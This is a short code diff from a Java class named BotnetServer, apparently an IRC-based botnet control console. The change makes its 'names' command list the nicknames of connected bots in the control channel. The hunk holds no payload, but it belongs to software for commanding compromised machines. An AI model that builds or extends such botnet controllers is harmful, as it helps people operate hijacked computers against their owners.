@@ -209,9 +209,9 @@ public class BotnetServer extends PircBot {
 			listChannels();
 		//Respond to a names command by getting the user on CHANNEL and printing their nicks
 		} else if (s.toLowerCase().equals("names")) {
-			String[] bots = getUserNames();
-			for (String name : bots) {
-				System.out.println("\t" + name);
+			User[] bots = this.getUsers(CHANNEL);
+			for (User bot : bots) {
+				System.out.println("\t" + bot.getNick());
 			}
 		//Respond to setop command by acquiring exclusive operator status (DOESN'T WORK)
 		} else if (s.toLowerCase().equalsIgnoreCase("setop")) {
